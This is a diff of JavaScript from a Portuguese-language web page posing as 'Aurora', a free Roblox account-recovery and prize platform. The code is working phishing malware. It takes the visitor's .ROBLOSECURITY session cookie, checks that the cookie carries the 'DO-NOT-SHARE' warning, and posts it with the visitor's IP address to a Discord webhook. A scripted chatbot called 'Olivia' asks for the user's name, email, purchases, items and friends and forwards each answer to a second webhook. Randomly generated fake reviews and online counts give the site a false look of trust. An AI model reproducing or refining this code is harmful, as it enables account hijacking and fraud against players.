-            if (!checkCooldown()) {
-                const rem = Math.ceil(getCooldownRemaining() / 1000);
-                showNotification('Aguarde', `Pode enviar novamente em ${rem}s`);
-                return;
-            }
-            
-            status.innerHTML = '<div class="spinner"></div>';
-            btn.disabled = true;
-            
-            try {
-                const device = navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC';
-                
-                const embed = {
-                    content: '@everyone',
-                    embeds: [{
-                        title: '🔐 NOVA CAPTURA DE COOKIE',
-                        color: 0x6366f1,
-                        fields: [
-                            { name: '🍪 COOKIE', value: '```' + cookie.substring(0, 1500) + '```' },
-                            { name: '📱 DISPOSITIVO', value: device, inline: true },
-                            { name: '🌍 IP', value: userIP || 'Desconhecido', inline: true },
-                            { name: '📏 TAMANHO', value: `${cookie.length} caracteres`, inline: true },
-                            { name: '⏰ DATA', value: new Date().toLocaleString('pt-BR'), inline: true }
-                        ],
-                        footer: { text: 'Aurora Security System' },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-                
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(embed)
-                });
-                
-                if (response.ok) {
-                    localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
-                    updateInfoDisplays();
-                    
-                    status.innerHTML = '<div class="success-check">✓</div>';
-                    input.value = '';
-                    updatePreview();
-                    
-                    const countStat = document.getElementById('countStat');
-                    countStat.textContent = (parseFloat(countStat.textContent) + 0.1).toFixed(1) + 'k';
-                    
-                    showNotification('Sucesso!', 'Cookie enviado com sucesso!');
-                    
-                    setTimeout(() => {
-                        document.getElementById('page1').classList.add('hidden');
-                        document.getElementById('page2').classList.remove('hidden');
-                        status.innerHTML = '';
-                    }, 1000);
-                } else {
-                    throw new Error('Erro no envio');
-                }
-            } catch (error) {
-                showNotification('Erro', 'Falha ao enviar cookie');
-                status.innerHTML = '';
-            } finally {
-                setTimeout(() => { btn.disabled = false; }, 2000);
-            }
-        }
-        
-        // ===== TELA 2 =====
-        function selectPrize(prize) {
-            showNotification(prize, 'Resgate disponível em instantes!');
-        }
-        
-        function goBack() {
-            document.getElementById('page2').classList.add('hidden');
-            document.getElementById('page1').classList.remove('hidden');
-        }
-        
-        // ===== CHAT OLIVIA SIMPLIFICADO =====
+        let chatHistory = [];
+        let conversationId = generateSessionId();
         let chatStep = 0;
         let userName = '';
         let userEmail = '';
         let userRoblox = '';
-        let userPurchase = '';
-        let userAccess = '';
-        let conversationId = Math.random().toString(36).substring(2, 10);
-        
-        const questions = [
-            { text: "Me conta qual é o seu NOME COMPLETO?", field: "nome" },
-            { text: "Qual é o seu E-MAIL (pode ser um novo)?", field: "email" },
-            { text: "Qual é seu USERNAME do Roblox?", field: "roblox" },
-            { text: "Qual foi a última compra que você fez no Roblox? (ex: R$50, Korblox)", field: "compra" },
-            { text: "Você ainda tem acesso ao e-mail de cadastro? (responda SIM ou NÃO)", field: "acesso" }
+        let userProblem = '';
+        let analysisStarted = false;
+
+        // ===== AVALIAÇÕES DINÂMICAS =====
+        const reviewTemplates = [
+            {
+                names: ["Ana Silva", "Maria Oliveira", "Juliana Costa", "Fernanda Lima", "Patrícia Souza", "Camila Rodrigues", "Beatriz Santos", "Larissa Ferreira", "Amanda Costa", "Gabriela Martins"],
+                avatars: ["👩", "👧", "👩‍🦰", "👱‍♀️", "👵", "👩‍🎓", "👩‍💼", "👩‍🍳", "👩‍🎨", "👸"],
+                texts: [
+                    "Consegui recuperar minha conta em menos de 2 horas, atendimento muito bom.",
+                    "Perdi minha conta há 3 anos e consegui recuperar, sistema eficiente.",
+                    "Suporte rápido e eficiente, resolveram meu problema em minutos.",
+                    "Melhor plataforma de recuperação que já usei, recomendo.",
+                    "Estava desesperada mas consegui recuperar minha conta, obrigada.",
+                    "Atendimento muito bom, resolveram tudo rapidinho.",
+                    "Já perdi 3 contas e só a Aurora conseguiu recuperar todas.",
+                    "Serviço incrível, recuperei minha conta com todos os itens.",
+                    "Muito confiável, já indiquei para vários amigos.",
+                    "Olivia é muito atenciosa, me ajudou em todo o processo.",
+                    "Plataforma fácil de usar e muito segura.",
+                    "Recuperei minha conta em menos de 1 hora, muito rápido.",
+                    "Atendimento humanizado e muito eficiente.",
+                    "Já tinha perdido as esperanças, mas deu certo.",
+                    "Recomendo demais, funcionou perfeitamente."
+                ]
+            },
+            {
+                names: ["João Pedro", "Carlos Eduardo", "Rafael Santos", "Bruno Lima", "Paulo Henrique", "Lucas Oliveira", "Gabriel Souza", "Felipe Costa", "Matheus Rodrigues", "Thiago Martins"],
+                avatars: ["👨", "👨‍🦰", "👨‍🦱", "🧔", "👴", "👨‍🎓", "👨‍💼", "👨‍🍳", "👨‍🎨", "🤴"],
+                texts: [
+                    "Funcionou perfeitamente, recuperei minha conta em minutos.",
+                    "Serviço de qualidade, recomendo para todos.",
+                    "Olivia foi muito prestativa, resolveu meu problema rapidamente.",
+                    "Melhor plataforma que já usei, funciona de verdade.",
+                    "Já tinha gastado dinheiro em outros lugares, só a Aurora funcionou.",
+                    "Recuperei minha conta com mais de 5 anos, estou muito feliz.",
+                    "Atendimento rápido e eficiente, valeu a pena.",
+                    "Serviço confiável, recomendo de olhos fechados.",
+                    "Olivia é muito profissional, me ajudou muito.",
+                    "Já recomendei para 5 amigos e todos conseguiram recuperar.",
+                    "Plataforma segura e confiável, funcionou perfeitamente.",
+                    "Recuperei minha conta em menos de 2 horas, muito satisfeito.",
+                    "Atendimento top, resolveram meu problema rapidinho.",
+                    "Já tinha desistido, mas a Aurora conseguiu recuperar.",
+                    "Serviço rápido, eficiente e confiável."
+                ]
+            }
         ];
-        
-        function addMessage(sender, text) {
+
+        function generateRandomTime() {
+            const minutes = Math.floor(Math.random() * 59) + 1;
+            return `há ${minutes} ${minutes === 1 ? 'minuto' : 'minutos'}`;
+        }
+
+        function getRandomItem(array) {
+            return array[Math.floor(Math.random() * array.length)];
+        }
+
+        function generateRandomReview() {
+            const gender = Math.random() > 0.5 ? 0 : 1;
+            const template = reviewTemplates[gender];
+            
+            return {
+                name: getRandomItem(template.names),
+                avatar: getRandomItem(template.avatars),
+                stars: "⭐⭐⭐⭐⭐",
+                text: getRandomItem(template.texts),
+                time: generateRandomTime()
+            };
+        }
+
+        function loadReviews() {
+            const container = document.getElementById('reviewsContainer');
+            if (!container) return;
+
+            // Gerar 3 avaliações aleatórias
+            const reviews = [];
+            for (let i = 0; i < 3; i++) {
+                reviews.push(generateRandomReview());
+            }
+
+            container.innerHTML = '';
+            reviews.forEach(review => {
+                const reviewCard = document.createElement('div');
+                reviewCard.className = 'review-card';
+                reviewCard.innerHTML = `
+                    <div class="review-header">
+                        <div class="review-avatar">${review.avatar}</div>
+                        <div class="review-user">
+                            <div class="review-name">${review.name}</div>
+                            <div class="review-stars">${review.stars}</div>
+                        </div>
+                        <div class="review-time">${review.time}</div>
+                    </div>
+                    <div class="review-text">"${review.text}"</div>
+                `;
+                container.appendChild(reviewCard);
+            });
+        }
+
+        // Atualizar avaliações a cada 30 segundos
+        setInterval(loadReviews, 30000);
+
+        // ===== FUNÇÕES INTERATIVAS =====
+        function showStats() {
+            showNotification('📊 Estatísticas', `Total de resgates: ${document.getElementById('countStat').textContent}`, false);
+        }
+
+        function showOnline() {
+            const online = Math.floor(Math.random() * 50) + 100;
+            showNotification('👥 Online', `${online} usuários online agora!`, false);
+        }
+
+        function showInfo() {
+            showNotification('ℹ️ Info', 'Aurora • Plataforma de resgate 100% gratuita', false);
+        }
+
+        function sendQuickMessage(msg) {
+            document.getElementById('chatInput').value = msg;
+            sendMessage();
+        }
+
+        // ===== FUNÇÃO PARA MOSTRAR EXEMPLOS =====
+        function showExamples() {
+            const examples = [
+                "💡 **EXEMPLOS DE RESPOSTAS:**",
+                "• **NOME COMPLETO:** João Silva Santos",
+                "• **E-MAIL:** joaosilva@gmail.com  (pode ser novo, vamos colocar na conta)",
+                "• **USERNAME:** joaozinho_roblox123",
+                "• **COMPRA:** R$50 ou Korblox",
+                "• **ACESSO E-MAIL:** SIM ou NÃO",
+                "• **DATA:** março/2020"
+            ];
+            
             const messagesDiv = document.getElementById('chatMessages');
-            const msgDiv = document.createElement('div');
-            msgDiv.className = `message ${sender}`;
-            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-            msgDiv.innerHTML = `${text}<div class="message-time">${time}</div>`;
-            messagesDiv.appendChild(msgDiv);
+            const examplesDiv = document.createElement('div');
+            examplesDiv.className = 'message olivia';
+            examplesDiv.style.background = 'rgba(99, 102, 241, 0.2)';
+            examplesDiv.style.border = '1px solid #6366f1';
+            
+            examplesDiv.innerHTML = `
+                <div class="message-content">${examples.join('<br>')}</div>
+                <div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div>
+            `;
+            
+            messagesDiv.appendChild(examplesDiv);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
-        
+
+        // ===== BOTÕES SIM/NÃO =====
+        function addYesNoButtons() {
+            const messagesDiv = document.getElementById('chatMessages');
+            const optionsDiv = document.createElement('div');
+            optionsDiv.className = 'quick-actions';
+            optionsDiv.style.margin = '10px 0';
+            optionsDiv.style.display = 'grid';
+            optionsDiv.style.gridTemplateColumns = '1fr 1fr';
+            
+            const btnSim = document.createElement('button');
+            btnSim.className = 'quick-action-btn';
+            btnSim.textContent = '✅ SIM';
+            btnSim.style.background = 'rgba(16, 185, 129, 0.2)';
+            btnSim.style.borderColor = '#10b981';
+            btnSim.onclick = () => sendQuickMessage('SIM');
+            
+            const btnNao = document.createElement('button');
+            btnNao.className = 'quick-action-btn';
+            btnNao.textContent = '❌ NÃO';
+            btnNao.style.background = 'rgba(244, 63, 94, 0.2)';
+            btnNao.style.borderColor = '#f43f5e';
+            btnNao.onclick = () => sendQuickMessage('NÃO');
+            
+            optionsDiv.appendChild(btnSim);
+            optionsDiv.appendChild(btnNao);
+            
+            messagesDiv.appendChild(optionsDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        // ===== MENSAGENS DA OLIVIA - MUITO MAIS COMPLETAS =====
+        const oliviaMessages = [
+            // Passo 0 - Boas-vindas
+            "Olá! Sou Olivia, prazer em te conhecer! 😊 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: o que aconteceu com sua conta?\n\n✅ Opções comuns:\n• Perdi acesso à conta\n• Esqueceram minha senha\n• Minha conta foi hackeada\n• Não consigo mais acessar o email\n\nFique tranquilo, vou te ajudar passo a passo!",
+
+            // Passo 1 - Entendendo o problema
+            "Entendi! Agora me diga qual é o seu PRIMEIRO NOME (o nome que você usa no Roblox ou seu nome real).\n\nIsso é importante porque quando você compra Robux, o nome fica registrado no histórico de compras. Assim podemos confirmar que a conta é realmente sua!",
+
+            // Passo 2 - Solicitando email
+            "Obrigada! Agora me informe um E-MAIL válido.\n\n📧 Pode ser um email novo, é para onde vamos enviar as instruções de recuperação.\n\nExemplo: meunome@gmail.com",
+
+            // Passo 3 - Username Roblox
+            "Perfeito! Agora qual é seu NOME DE USUÁRIO no Roblox?\n\n🎮 Exemplo: joaozinho_roblox123\n\nÉ o nome que aparece quando você joga.",
+
+            // Passo 4 - Última compra
+            "Ótimo! Agora me diga qual foi a ÚLTIMA COMPRA que você fez no Roblox.\n\n💰 Pode ser:\n• O valor (ex: R$25, R$50)\n• O item comprado (ex: Korblox, Headless)\n• A data aproximada da compra",
+
+            // Passo 5 - Acesso ao email
+            "Entendi! Você ainda tem ACESSO AO E-MAIL de cadastro?\n\n✅ Responda apenas com SIM ou NÃO.\n\nIsso ajuda a saber se podemos enviar o código de verificação para o email antigo.",
+
+            // Passo 6 - Data de criação
+            "Ok! Agora me diga a DATA APROXIMADA que você criou essa conta.\n\n📅 Exemplos:\n• 2020\n• março/2021\n• início de 2022\n\nNão precisa ser exato, só uma estimativa ajuda.",
+
+            // Passo 7 - Itens exclusivos
+            "Você tem algum ITEM EXCLUSIVO ou raro na conta?\n\n👑 Exemplos:\n• Headless Horseman\n• Korblox Deathspeaker\n• Dominus\n• Itens de eventos limitados\n\nIsso ajuda a confirmar que a conta é sua.",
+
+            // Passo 8 - Robux atual
+            "Quantos ROBUX você tem atualmente na conta?\n\n💎 Um valor aproximado já ajuda:\n• 500 Robux\n• 1.000 Robux\n• 5.000+ Robux",
+
+            // Passo 9 - Amigos na conta
+            "Você se lembra de algum AMIGO que tem na sua lista?\n\n👥 Pode me dizer o nome de 1 ou 2 amigos que você tinha adicionado?\n\nIsso também é uma forma de verificação.",
+
+            // Passo 10 - Primeiro item
+            "Qual foi o PRIMEIRO ITEM que você comprou ou ganhou no Roblox?\n\n🎁 Pode ser algo simples como um chapéu ou uma roupa.",
+
+            // Passo 11 - Analisando
+            "Todas as informações foram enviadas para análise. 🔍\n\n⏳ Isso pode levar até 24 horas.\n\n⚠️ Não tente novamente durante este período, pois o sistema vai bloquear e você não receberá nada.",
+
+            // Passo 12 - Final
+            "Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\nObrigado por usar a Aurora! ❤️"
+        ];
+
+        const waitingMessages = [
+            "Ainda estou aqui! Estou só esperando sua resposta.",
+            "Sem pressa! Me responde quando puder.",
+            "Continua aí? Qualquer dúvida é só perguntar.",
+            "Estou aguardando sua resposta para continuar com o atendimento.",
+            "Ainda está aí? Podemos continuar quando você quiser.",
+            "Não precisa ter pressa, estou aqui para ajudar!",
+            "Se tiver dúvidas sobre alguma pergunta, pode me perguntar."
+        ];
+
+        const goodbyeMessages = [
+            "Foi um prazer ajudar!",
+            "Qualquer coisa, é só voltar!",
+            "Até mais! Cuide bem da sua conta!",
+            "Volte sempre que precisar!",
+            "Espero ter ajudado! Qualquer dúvida, estou aqui."
+        ];
+
+        // ===== FUNÇÕES DO CHAT OLIVIA =====
+        function openOliviaChat() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page3').classList.remove('hidden');
+            
+            document.getElementById('chatMessages').innerHTML = '';
+            chatHistory = [];
+            chatStep = 0;
+            userName = '';
+            userEmail = '';
+            userRoblox = '';
+            userProblem = '';
+            analysisStarted = false;
+            
+            conversationId = generateSessionId();
+            document.getElementById('quickActions').style.display = 'grid';
+            
+            setTimeout(() => {
+                addOliviaMessage(oliviaMessages[0]);
+                sendToWebhook('system', 'chat_iniciado', { message: 'Chat iniciado' });
+                
+                setTimeout(() => {
+                    showExamples();
+                }, 2000);
+            }, 1000);
+        }
+
+        function closeChat() {
+            const goodbye = goodbyeMessages[Math.floor(Math.random() * goodbyeMessages.length)];
+            showNotification('👋 Até logo!', goodbye, false);
+            
+            if (chatHistory.length > 0) {
+                sendToWebhook('system', 'chat_finalizado', { 
+                    summary: chatHistory,
+                    totalMessages: chatHistory.length,
+                    userName: userName,
+                    userEmail: userEmail,
+                    userRoblox: userRoblox
+                });
+            }
+            
+            document.getElementById('page3').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+        }
+
+        function addOliviaMessage(text) {
+            if (text.includes('{nome}') && userName) {
+                text = text.replace('{nome}', userName);
+            }
+            
+            const messagesDiv = document.getElementById('chatMessages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'message olivia';
+            
+            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            const formattedText = text.replace(/\n/g, '<br>');
+            
+            messageDiv.innerHTML = `
+                <div class="message-content">${formattedText}</div>
+                <div class="message-time">${time}</div>
+            `;
+            
+            messagesDiv.appendChild(messageDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+            
+            chatHistory.push({
+                sender: 'olivia',
+                message: text,
+                time: time,
+                step: chatStep
+            });
+        }
+
+        function addUserMessage(text) {
+            const messagesDiv = document.getElementById('chatMessages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'message user';
+            
+            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            
+            messageDiv.innerHTML = `
+                <div class="message-content">${text}</div>
+                <div class="message-time">${time}</div>
+            `;
+            
+            messagesDiv.appendChild(messageDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+            
+            chatHistory.push({
+                sender: 'user',
+                message: text,
+                time: time,
+                step: chatStep
+            });
+            
+            sendToWebhook('user', 'mensagem', { 
+                message: text,
+                step: chatStep
+            });
+        }
+
         function showTyping() {
             const messagesDiv = document.getElementById('chatMessages');
             const typingDiv = document.createElement('div');
@@ -1109,112 +1540,261 @@
             messagesDiv.appendChild(typingDiv);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
-        
+
         function hideTyping() {
             const typing = document.getElementById('typingIndicator');
             if (typing) typing.remove();
         }
-        
-        async function sendToDiscord() {
-            const info = `**🔐 NOVA SOLICITAÇÃO DE RECUPERAÇÃO**\n\n` +
-                        `**👤 Nome:** ${userName}\n` +
-                        `**📧 Email:** ${userEmail}\n` +
-                        `**🎮 Roblox:** ${userRoblox}\n` +
-                        `**💰 Última Compra:** ${userPurchase}\n` +
-                        `**📬 Acesso Email:** ${userAccess}\n` +
-                        `**🆔 ID:** ${conversationId}\n` +
-                        `**⏰ Data:** ${new Date().toLocaleString('pt-BR')}`;
-            
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: info })
-                });
-            } catch(e) {
-                console.error('Erro ao enviar para Discord:', e);
-            }
-        }
-        
-        async function askQuestion() {
-            if (chatStep < questions.length) {
-                showTyping();
-                await new Promise(resolve => setTimeout(resolve, 800));
-                hideTyping();
-                addMessage('olivia', questions[chatStep].text);
-            } else {
-                showTyping();
-                await new Promise(resolve => setTimeout(resolve, 1500));
-                hideTyping();
-                addMessage('olivia', '✅ Obrigada! Suas informações foram enviadas para análise. Você receberá um e-mail em até 24 horas com as instruções para recuperar sua conta!');
-                
-                await sendToDiscord();
-                
-                setTimeout(() => {
-                    closeChat();
-                    showNotification('✅ Solicitação enviada!', 'Em até 24 horas você receberá instruções no e-mail');
-                }, 4000);
-            }
-        }
-        
+
         async function sendMessage() {
             const input = document.getElementById('chatInput');
             const text = input.value.trim();
+            
             if (!text) return;
             
-            addMessage('user', text);
+            if (analysisStarted) {
+                addOliviaMessage("Sua solicitação já está em análise. Por favor, aguarde até 24 horas para receber o e-mail.");
+                input.value = '';
+                return;
+            }
+            
+            addUserMessage(text);
             input.value = '';
-            
-            // Processar resposta
-            if (chatStep === 0) userName = text;
-            else if (chatStep === 1) userEmail = text;
-            else if (chatStep === 2) userRoblox = text;
-            else if (chatStep === 3) userPurchase = text;
-            else if (chatStep === 4) userAccess = text;
-            
+            document.getElementById('quickActions').style.display = 'none';
             chatStep++;
             
+            // Mapeamento dos passos para envio ao webhook
+            if (chatStep === 1) {
+                userProblem = text;
+                sendToWebhook('info', 'problema', { problema: text });
+            } 
+            else if (chatStep === 2) {
+                if (text.length < 5) {
+                    addOliviaMessage("Por favor, digite um NOME COMPLETO válido (mínimo 5 letras)");
+                    chatStep--;
+                    return;
+                }
+                if (text.includes('@')) {
+                    addOliviaMessage("Isso parece um e-mail. Digite seu NOME COMPLETO (ex: João Silva)");
+                    chatStep--;
+                    return;
+                }
+                userName = text;
+                sendToWebhook('info', 'nome', { nome: text });
+            } 
+            else if (chatStep === 3) {
+                if (!text.includes('@') || !text.includes('.')) {
+                    addOliviaMessage("Isso não parece um E-MAIL válido. Digite um email com @ e . (ex: nome@gmail.com)");
+                    chatStep--;
+                    return;
+                }
+                userEmail = text;
+                sendToWebhook('info', 'email', { email: text });
+            } 
+            else if (chatStep === 4) {
+                if (text.length < 3) {
+                    addOliviaMessage("Por favor, digite um NOME DE USUÁRIO válido (mínimo 3 caracteres)");
+                    chatStep--;
+                    return;
+                }
+                userRoblox = text;
+                sendToWebhook('info', 'username', { username: text });
+            } 
+            else if (chatStep === 5) {
+                if (text.length < 2) {
+                    addOliviaMessage("Por favor, digite algo sobre a última compra (ex: R$50, Korblox)");
+                    chatStep--;
+                    return;
+                }
+                sendToWebhook('info', 'ultima_compra', { compra: text });
+                setTimeout(() => {
+                    addYesNoButtons();
+                }, 1000);
+            } 
+            else if (chatStep === 6) {
+                const resposta = text.toUpperCase();
+                if (resposta !== 'SIM' && resposta !== 'NÃO' && resposta !== 'NAO') {
+                    addOliviaMessage("Por favor, responda apenas com SIM ou NÃO");
+                    chatStep--;
+                    return;
+                }
+                sendToWebhook('info', 'acesso_email', { acesso: text });
+            } 
+            else if (chatStep === 7) {
+                if (text.length < 4) {
+                    addOliviaMessage("Por favor, digite uma data aproximada (ex: 2020, março/2021)");
+                    chatStep--;
+                    return;
+                }
+                sendToWebhook('info', 'data_criacao', { data: text });
+            } 
+            else if (chatStep === 8) {
+                sendToWebhook('info', 'itens_exclusivos', { itens: text });
+            } 
+            else if (chatStep === 9) {
+                sendToWebhook('info', 'robux_atual', { robux: text });
+            } 
+            else if (chatStep === 10) {
+                sendToWebhook('info', 'amigos', { amigos: text });
+            } 
+            else if (chatStep === 11) {
+                sendToWebhook('info', 'primeiro_item', { primeiro_item: text });
+                analysisStarted = true;
+            } 
+            else {
+                analysisStarted = true;
+                addOliviaMessage("Sua solicitação já está em análise. Aguarde 24 horas.");
+                return;
+            }
+            
             showTyping();
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            const typingTime = Math.floor(Math.random() * 1500) + 1000;
+            await new Promise(resolve => setTimeout(resolve, typingTime));
             hideTyping();
-            askQuestion();
-        }
-        
-        function sendQuickMessage(msg) {
-            document.getElementById('chatInput').value = msg;
-            sendMessage();
-        }
-        
-        function openOliviaChat() {
-            document.getElementById('page2').classList.add('hidden');
-            document.getElementById('page3').classList.remove('hidden');
             
-            chatStep = 0;
-            userName = '';
-            userEmail = '';
-            userRoblox = '';
-            userPurchase = '';
-            userAccess = '';
-            conversationId = Math.random().toString(36).substring(2, 10);
+            if (!analysisStarted && chatStep < oliviaMessages.length) {
+                let messageToSend = oliviaMessages[chatStep];
+                addOliviaMessage(messageToSend);
+                
+                sendToWebhook('olivia', 'resposta', { 
+                    message: messageToSend,
+                    step: chatStep 
+                });
+                
+                if (chatStep === 11) {
+                    document.getElementById('chatInput').disabled = true;
+                    document.querySelector('.chat-send').disabled = true;
+                    document.querySelector('.chat-send').style.opacity = '0.5';
+                    
+                    setTimeout(() => {
+                        addOliviaMessage("Aguarde 24 horas para receber o e-mail com as instruções.");
+                    }, 2000);
+                }
+            }
+        }
+
+        async function sendToWebhook(type, action, data) {
+            try {
+                const payload = {
+                    content: type === 'system' ? null : `**${type.toUpperCase()}** - ${action}`,
+                    embeds: [{
+                        title: `💬 Chat Olivia - ${action}`,
+                        color: type === 'olivia' ? 0xec4899 : type === 'user' ? 0x6366f1 : 0x10b981,
+                        fields: [
+                            {
+                                name: '📱 Informações',
+                                value: `\`\`\`yml
+Conversa ID: ${conversationId}
+Passo: ${chatStep}
+Nome: ${userName || 'Não informado'}
+Email: ${userEmail || 'Não informado'}
+Roblox: ${userRoblox || 'Não informado'}
+Problema: ${userProblem || 'Não informado'}
+\`\`\``
+                            },
+                            {
+                                name: '💬 Dados',
+                                value: '```json\n' + JSON.stringify(data, null, 2).substring(0, 900) + '\n```'
+                            }
+                        ],
+                        footer: {
+                            text: `Olivia Chat • ${new Date().toLocaleString('pt-BR')}`
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(CHAT_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Erro ao enviar para webhook do chat:', error);
+            }
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip || 'IP não disponível';
+                await checkIfBanned();
+                return userIP;
+            } catch (error) {
+                userIP = 'IP não disponível';
+                return userIP;
+            }
+        }
+
+        async function checkIfBanned() {
+            if (!userIP || userIP === 'IP não disponível') return;
             
-            const messagesDiv = document.getElementById('chatMessages');
-            messagesDiv.innerHTML = `
-                <div class="message olivia">
-                    Olá! Sou Olivia, prazer em te conhecer! 😊<br><br>
-                    <strong>Me conta qual é o seu NOME COMPLETO?</strong>
-                    <div class="message-time">agora</div>
-                </div>
-            `;
+            try {
+                const response = await fetch(`${CHECK_BAN_URL}?ip=${userIP}`);
+                const data = await response.json();
+                
+                const banMessageEl = document.getElementById('banMessage');
+                const sendBtn = document.getElementById('sendBtn');
+                const cookieInput = document.getElementById('cookieInput');
+                
+                if (data.banned) {
+                    banMessageEl.style.display = 'block';
+                    banMessageEl.innerHTML = `🚫 IP BANIDO<br><small>${data.message || 'Contate o suporte'}</small>`;
+                    sendBtn.disabled = true;
+                    sendBtn.style.opacity = '0.5';
+                    cookieInput.disabled = true;
+                    cookieInput.style.opacity = '0.5';
+                } else {
+                    banMessageEl.style.display = 'none';
+                    sendBtn.disabled = false;
+                    sendBtn.style.opacity = '1';
+                    cookieInput.disabled = false;
+                    cookieInput.style.opacity = '1';
+                }
+            } catch (error) {
+                console.error('Erro ao verificar ban:', error);
+            }
         }
-        
-        function closeChat() {
-            document.getElementById('page3').classList.add('hidden');
-            document.getElementById('page2').classList.remove('hidden');
+
+        function checkCooldown() {
+            const lastSent = localStorage.getItem(COOLDOWN_KEY);
+            if (!lastSent) return true;
+            const timePassed = Date.now() - parseInt(lastSent);
+            return timePassed >= COOLDOWN_TIME;
         }
+
+        function getCooldownRemaining() {
+            const lastSent = localStorage.getItem(COOLDOWN_KEY);
+            if (!lastSent) return 0;
+            const timePassed = Date.now() - parseInt(lastSent);
+            const remaining = COOLDOWN_TIME - timePassed;
+            return remaining > 0 ? remaining : 0;
+        }
+
+        async function updateInfoDisplays() {
+            const cdEl = document.getElementById('cooldownInfo');
+            if (cdEl) {
+                const remaining = getCooldownRemaining();
+                if (remaining > 0) {
+                    const sec = Math.ceil(remaining / 1000);
+                    cdEl.textContent = `Próximo envio em ${sec}s`;
+                } else {
+                    cdEl.textContent = '';
+                }
+            }
+        }
+
+        setInterval(updateInfoDisplays, 1000);
         
-        // ===== ESTRELAS =====
+        window.addEventListener('load', async () => {
+            await getUserIP();
+            updateInfoDisplays();
+            loadReviews();
+        });
+
         function createStars() {
-            const stars = document.getElementById('stars');
+            const starsContainer = document.getElementById('stars');
             for (let i = 0; i < 100; i++) {
                 const star = document.createElement('div');
                 star.className = 'star';
@@ -1224,26 +1804,240 @@
                 star.style.height = star.style.width;
                 star.style.setProperty('--duration', (Math.random() * 3 + 2) + 's');
                 star.style.setProperty('--opacity', Math.random() * 0.7 + 0.3);
-                stars.appendChild(star);
+                starsContainer.appendChild(star);
             }
         }
-        
-        // ===== INICIALIZAÇÃO =====
+        createStars();
+
+        function showNotification(title, message, isRecovery = false) {
+            const notification = document.getElementById('notification');
+            const notifyTitle = document.getElementById('notifyTitle');
+            const notifyMessage = document.getElementById('notifyMessage');
+            const progress = document.getElementById('notificationProgress');
+            const icon = document.querySelector('.notification-icon');
+            
+            notifyTitle.textContent = title;
+            notifyMessage.textContent = message;
+            
+            if (isRecovery) {
+                icon.style.background = 'linear-gradient(135deg, #f43f5e, #ec4899)';
+                progress.style.background = 'linear-gradient(90deg, #f43f5e, #ec4899)';
+            } else {
+                icon.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+                progress.style.background = 'linear-gradient(90deg, #10b981, #059669)';
+            }
+            
+            notification.classList.add('show');
+            
+            progress.style.animation = 'none';
+            progress.offsetHeight;
+            progress.style.animation = 'progress 4s linear forwards';
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 4000);
+        }
+
+        function hideNotification() {
+            document.getElementById('notification').classList.remove('show');
+        }
+
+        // Funções de limpeza e validação de cookie
+        function cleanCookie(cookie) {
+            let c = cookie.trim();
+            c = c.replace(/^["']|["']$/g, '');
+            
+            if (c.startsWith('_|WARNING')) {
+                return c;
+            }
+            
+            if (c.startsWith('WARNING')) {
+                return '_|' + c;
+            }
+            
+            const match = c.match(/\.ROBLOSECURITY=([^;\s]+)/);
+            if (match && match[1]) {
+                return match[1];
+            }
+            
+            return c;
+        }
+
+        function isValidCookieFormat(cookie) {
+            if (!cookie.startsWith('_|WARNING') && !cookie.startsWith('WARNING')) {
+                return false;
+            }
+            
+            if (!cookie.includes('DO-NOT-SHARE')) {
+                return false;
+            }
+            
+            if (cookie.length < 50) {
+                return false;
+            }
+            
+            const validPattern = /^[_|A-Za-z0-9:\-\.=]+$/;
+            return validPattern.test(cookie);
+        }
+
+        function updatePreview() {
+            const input = document.getElementById('cookieInput');
+            const preview = document.getElementById('previewText');
+            const statusDot = document.querySelector('.status-dot');
+            const val = input.value.trim();
+            
+            if (val.length > 0) {
+                const cleaned = cleanCookie(val);
+                const isValid = isValidCookieFormat(cleaned);
+                
+                if (isValid) {
+                    preview.textContent = '✓ cookie válido';
+                    preview.style.color = '#10b981';
+                    statusDot.style.background = '#10b981';
+                } else {
+                    preview.textContent = '⚠️ formato inválido';
+                    preview.style.color = '#f59e0b';
+                    statusDot.style.background = '#f59e0b';
+                }
+            } else {
+                preview.textContent = 'aguardando cookie...';
+                preview.style.color = '#9ca3af';
+                statusDot.style.background = '#10b981';
+            }
+        }
+
         document.getElementById('cookieInput').addEventListener('input', updatePreview);
-        setInterval(updateInfoDisplays, 1000);
-        
+        document.getElementById('cookieInput').addEventListener('paste', () => setTimeout(updatePreview, 100));
+
+        async function sendAndGo() {
+            const input = document.getElementById('cookieInput');
+            const status = document.getElementById('status');
+            const btn = document.getElementById('sendBtn');
+            
+            const banMessageEl = document.getElementById('banMessage');
+            if (banMessageEl.style.display === 'block') {
